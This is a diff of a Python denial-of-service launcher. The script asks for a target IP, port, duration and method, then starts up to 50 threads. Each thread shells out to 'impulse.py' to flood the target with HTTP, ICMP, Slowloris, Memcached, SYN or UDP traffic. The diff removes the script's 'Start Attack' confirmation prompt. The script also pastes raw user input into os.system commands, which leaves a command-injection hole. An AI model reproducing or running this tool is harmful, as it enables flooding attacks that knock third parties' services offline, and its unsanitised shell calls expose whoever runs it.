@@ -82,58 +82,42 @@ helpmenu = """
 
   If any methods give a shit ton of errors, and it says Name or service not known,
   try IPv4, if that didn't work, the ip doesn't work.
+
 """
 print(Fore.RED + logo + Fore.BLUE)
 print(Fore.MAGENTA+helpmenu+Fore.WHITE)
 
 ip = input(Fore.CYAN+"  URL/IP: "+Fore.WHITE)
-threadcount = float(input(Fore.CYAN+"  How many threads (1-300): "+Fore.WHITE))
-count = float(input(Fore.CYAN+"  Multiplier(1-50): "+Fore.WHITE))
+threadcount = input(Fore.CYAN+"  How many threads (1-300): "+Fore.WHITE)
+count = input(Fore.CYAN+"  Multiplier(1-50): "+Fore.WHITE)
 length = input(Fore.CYAN+"  How long to hit (Seconds): "+Fore.WHITE)
 port = input(Fore.CYAN+"  Port: ")
 hitmethod = input(Fore.CYAN+"  Method: "+Fore.WHITE)
 
-threadcounted = int(threadcount)
-
 def http():
   print(Fore.GREEN+"  Started Thread!")
-  os.system("python3.9 impulse.py --target "+ip+":"+port+ " --time "+ length+" --threads "+str(threadcounted)+" --method HTTP")
+  os.system("python3.9 impulse.py --target "+ip+":"+port+ " --time "+ length+" --threads "+threadcount+" --method HTTP")
   print(Fore.GREEN + "  Started "+threading.current_thread().name +"!")
 def icmp():
   print(Fore.GREEN+"  Started Thread!")
-  os.system("python3.9 impulse.py --target "+ip+":"+port+" --time "+length+" --threads "+str(threadcounted)+" --method ICMP")
+  os.system("python3.9 impulse.py --target "+ip+":"+port+" --time "+length+" --threads "+threadcount+" --method ICMP")
   print(Fore.GREEN + "  Started "+threading.current_thread().name +"!")
 def slowloris():
   print(Fore.GREEN+"  Started Thread!")
-  os.system("python3.9 impulse.py --target "+ip+":"+port+" --time "+length+" --threads "+str(threadcounted)+" --method SLOWLORIS")
+  os.system("python3.9 impulse.py --target "+ip+":"+port+" --time "+length+" --threads "+threadcount+" --method SLOWLORIS")
   print(Fore.GREEN + "  Started "+threading.current_thread().name +"!")
 def memcached():
   print(Fore.GREEN+"  Started Thread!")
-  os.system("python3.9 impulse.py --target "+ip+":"+port+" --time "+length+" --threads "+str(threadcounted)+" --method MEMCACHED")
+  os.system("python3.9 impulse.py --target "+ip+":"+port+" --time "+length+" --threads "+threadcount+" --method MEMCACHED")
   print(Fore.GREEN + "  Started "+threading.current_thread().name +"!")
 def syn():
   print(Fore.GREEN+"  Started Thread!")
-  os.system("python3.9 impulse.py --target "+ip+":"+port+" --time "+length+" --threads "+str(threadcounted)+" --method SYN")
+  os.system("python3.9 impulse.py --target "+ip+":"+port+" --time "+length+" --threads "+threadcount+" --method SYN")
   print(Fore.GREEN + "  Started "+threading.current_thread().name +"!")
 def udp():
   print(Fore.GREEN+"  Started Thread!")
-  os.system("python3.9 impulse.py --target "+ip+":"+port+" --time "+length+" --threads "+str(threadcounted)+" --method UDP")
+  os.system("python3.9 impulse.py --target "+ip+":"+port+" --time "+length+" --threads "+threadcount+" --method UDP")
   print(Fore.GREEN + "  Started "+threading.current_thread().name +"!")
-
-counted = count * threadcount
-
-yesno = input(Fore.LIGHTYELLOW_EX+"  Start Attack on "+ip+" With "+str(counted)+" Threads"+"? Y/N: "+Fore.WHITE)
-
-if yesno == "n":
-  print(Fore.BLUE+"  Exiting...")
-  time.sleep(2)
-  os.system("clear")
-  exit()
-if yesno == "N":
-  print(Fore.BLUE+"  Exiting...")
-  time.sleep(2)
-  os.system("clear")
-  exit()
 if hitmethod == "HTTP":
   t1 = threading.Thread(target=http)
   t2 = threading.Thread(target=http)
@@ -746,34 +730,34 @@ if hitmethod == "udp":
   t48 = threading.Thread(target=udp)
   t49 = threading.Thread(target=udp)
   t50 = threading.Thread(target=udp)
-if float(count) == 1:
+if count == '1':
   t1.start()
-if float(count) == 2:
+if count == '2':
   t1.start()
   t2.start()
-if float(count) == 3:
+if count == '3':
   t1.start()
   t2.start()
   t3.start()
-if float(count) == 4:
+if count == '4':
   t1.start()
   t2.start()
   t3.start()
   t4.start()
-if float(count) == 5:
+if count == '5':
   t1.start()
   t2.start()
   t3.start()
   t4.start()
   t5.start()
-if float(count) == 6:
+if count == '6':
   t1.start()
   t2.start()
   t3.start()
   t4.start()
   t5.start()
   t6.start()
-if float(count) == 7:
+if count == '7':
   t1.start()
   t2.start()
   t3.start()
@@ -781,7 +765,7 @@ if float(count) == 7:
   t5.start()
   t6.start()
   t7.start()
-if float(count) == 8:
+if count == '8':
   t1.start()
   t2.start()
   t3.start()
@@ -790,7 +774,7 @@ if float(count) == 8:
   t6.start()
   t7.start()
   t8.start()
-if float(count) == 9:
+if count == '9':
   t1.start()
   t2.start()
   t3.start()
@@ -800,7 +784,7 @@ if float(count) == 9:
   t7.start()
   t8.start()
   t9.start()
-if float(count) == 10:
+if count == '10':
   t1.start()
   t2.start()
   t3.start()
@@ -811,7 +795,7 @@ if float(count) == 10:
   t8.start()
   t9.start()
   t10.start()
-if float(count) == 11:
+if count == '11':
   t1.start()
   t2.start()
   t3.start()
@@ -823,7 +807,7 @@ if float(count) == 11:
   t9.start()
   t10.start()
   t11.start()
-if float(count) == 12:
+if count == '12':
   t1.start()
   t2.start()
   t3.start()
@@ -836,7 +820,7 @@ if float(count) == 12:
   t10.start()
   t11.start()
   t12.start()
-if float(count) == 13:
+if count == '13':
   t1.start()
   t2.start()
   t3.start()
@@ -850,7 +834,7 @@ if float(count) == 13:
   t11.start()
   t12.start()
   t13.start()
-if float(count) == 14:
+if count == '14':
   t1.start()
   t2.start()
   t3.start()
@@ -865,7 +849,7 @@ if float(count) == 14:
   t12.start()
   t13.start()
   t14.start()
-if float(count) == 15:
+if count == '15':
   t1.start()
   t2.start()
   t3.start()
@@ -881,7 +865,7 @@ if float(count) == 15:
   t13.start()
   t14.start()
   t15.start()
-if float(count) == 16:
+if count == '16':
   t1.start()
   t2.start()
   t3.start()
@@ -898,7 +882,7 @@ if float(count) == 16:
   t14.start()
   t15.start()
   t16.start()
-if float(count) == 17:
+if count == '17':
   t1.start()
   t2.start()
   t3.start()
@@ -916,7 +900,7 @@ if float(count) == 17:
   t15.start()
   t16.start()
   t17.start()
-if float(count) == 18:
+if count == '18':
   t1.start()
   t2.start()
   t3.start()
@@ -935,7 +919,7 @@ if float(count) == 18:
   t16.start()
   t17.start()
   t18.start()
-if float(count) == 19:
+if count == '19':
   t1.start()
   t2.start()
   t3.start()
@@ -955,7 +939,7 @@ if float(count) == 19:
   t17.start()
   t18.start()
   t19.start()
-if float(count) == 20:
+if count == '20':
   t1.start()
   t2.start()
   t3.start()
@@ -979,7 +963,7 @@ if float(count) == 20:
   t18.start()
   t19.start()
   t20.start()
-if float(count) == 21:
+if count == '21':
   t1.start()
   t2.start()
   t3.start()
@@ -1004,7 +988,7 @@ if float(count) == 21:
   t19.start()
   t20.start()
   t21.start()
-if float(count) == 22:
+if count == '22':
   t1.start()
   t2.start()
   t3.start()
@@ -1030,7 +1014,7 @@ if float(count) == 22:
   t20.start()
   t21.start()
   t22.start()
-if float(count) == 23:
+if count == '23':
   t1.start()
   t2.start()
   t3.start()
@@ -1057,7 +1041,7 @@ if float(count) == 23:
   t21.start()
   t22.start()
   t23.start()
-if float(count) == 24:
+if count == '24':
   t1.start()
   t2.start()
   t3.start()
@@ -1085,7 +1069,7 @@ if float(count) == 24:
   t22.start()
   t23.start()
   t24.start()
-if float(count) == 25:
+if count == '25':
   t1.start()
   t2.start()
   t3.start()
@@ -1114,7 +1098,7 @@ if float(count) == 25:
   t23.start()
   t24.start()
   t25.start()
-if float(count) == 26:
+if count == '26':
   t1.start()
   t2.start()
   t3.start()
@@ -1144,7 +1128,7 @@ if float(count) == 26:
   t24.start()
   t25.start()
   t26.start()
-if float(count) == 27:
+if count == '27':
   t1.start()
   t2.start()
   t3.start()
@@ -1175,7 +1159,7 @@ if float(count) == 27:
   t25.start()
   t26.start()
   t27.start()
-if float(count) == 28:
+if count == '28':
   t1.start()
   t2.start()
   t3.start()
@@ -1207,7 +1191,7 @@ if float(count) == 28:
   t26.start()
   t27.start()
   t28.start()
-if float(count) == 29:
+if count == '29':
   t1.start()
   t2.start()
   t3.start()
@@ -1240,7 +1224,7 @@ if float(count) == 29:
   t27.start()
   t28.start()
   t29.start()
-if float(count) == 30:
+if count == '30':
   t1.start()
   t2.start()
   t3.start()
@@ -1274,7 +1258,7 @@ if float(count) == 30:
   t28.start()
   t29.start()
   t30.start()
-if float(count) == 31:
+if count == '31':
   t1.start()
   t2.start()
   t3.start()
@@ -1309,7 +1293,7 @@ if float(count) == 31:
   t29.start()
   t30.start()
   t31.start()
-if float(count) == 32:
+if count == '32':
   t1.start()
   t2.start()
   t3.start()
@@ -1345,7 +1329,7 @@ if float(count) == 32:
   t30.start()
   t31.start()
   t32.start()
-if float(count) == 33:
+if count == '33':
   t1.start()
   t2.start()
   t3.start()
@@ -1382,7 +1366,7 @@ if float(count) == 33:
   t31.start()
   t32.start()
   t33.start()
-if float(count) == 34:
+if count == '34':
   t1.start()
   t2.start()
   t3.start()
@@ -1420,7 +1404,7 @@ if float(count) == 34:
   t32.start()
   t33.start()
   t34.start()
-if float(count) == 35:
+if count == '35':
   t1.start()
   t2.start()
   t3.start()
@@ -1459,7 +1443,7 @@ if float(count) == 35:
   t33.start()
   t34.start()
   t35.start()
-if float(count) == 36:
+if count == '36':
   t1.start()
   t2.start()
   t3.start()
@@ -1499,7 +1483,7 @@ if float(count) == 36:
   t34.start()
   t35.start()
   t36.start()
-if float(count) == 37:
+if count == '37':
   t1.start()
   t2.start()
   t3.start()
@@ -1540,7 +1524,7 @@ if float(count) == 37:
   t35.start()
   t36.start()
   t37.start()
-if float(count) == 38:
+if count == '38':
   t1.start()
   t2.start()
   t3.start()
@@ -1582,7 +1566,7 @@ if float(count) == 38:
   t36.start()
   t37.start()
   t38.start()
-if float(count) == 39:
+if count == '39':
   t1.start()
   t2.start()
   t3.start()
@@ -1625,7 +1609,7 @@ if float(count) == 39:
   t37.start()
   t38.start()
   t39.start()
-if float(count) == 40:
+if count == '40':
   t1.start()
   t2.start()
   t3.start()
@@ -1669,7 +1653,7 @@ if float(count) == 40:
   t38.start()
   t39.start()
   t40.start()
-if float(count) == 41:
+if count == '41':
   t1.start()
   t2.start()
   t3.start()
@@ -1714,7 +1698,7 @@ if float(count) == 41:
   t39.start()
   t40.start()
   t41.start()
-if float(count) == 42:
+if count == '42':
   t1.start()
   t2.start()
   t3.start()
@@ -1760,7 +1744,7 @@ if float(count) == 42:
   t40.start()
   t41.start()
   t42.start()
-if float(count) == 43:
+if count == '43':
   t1.start()
   t2.start()
   t3.start()
@@ -1807,7 +1791,7 @@ if float(count) == 43:
   t41.start()
   t42.start()
   t43.start()
-if float(count) == 44:
+if count == '44':
   t1.start()
   t2.start()
   t3.start()
@@ -1855,7 +1839,7 @@ if float(count) == 44:
   t42.start()
   t43.start()
   t44.start()
-if float(count) == 45:
+if count == '45':
   t1.start()
   t2.start()
   t3.start()
@@ -1904,7 +1888,7 @@ if float(count) == 45:
   t43.start()
   t44.start()
   t45.start()
-if float(count) == 46:
+if count == '46':
   t1.start()
   t2.start()
   t3.start()
@@ -1954,7 +1938,7 @@ if float(count) == 46:
   t44.start()
   t45.start()
   t46.start()
-if float(count) == 47:
+if count == '47':
   t1.start()
   t2.start()
   t3.start()
@@ -2005,7 +1989,7 @@ if float(count) == 47:
   t45.start()
   t46.start()
   t47.start()
-if float(count) == 48:
+if count == '48':
   t1.start()
   t2.start()
   t3.start()
@@ -2057,7 +2041,7 @@ if float(count) == 48:
   t46.start()
   t47.start()
   t48.start()
-if float(count) == 49:
+if count == '49':
   t1.start()
   t2.start()
   t3.start()
@@ -2110,7 +2094,7 @@ if float(count) == 49:
   t47.start()
   t48.start()
   t49.start()
-if float(count) == 50:
+if count == '50':
   t1.start()
   t2.start()
   t3.start()
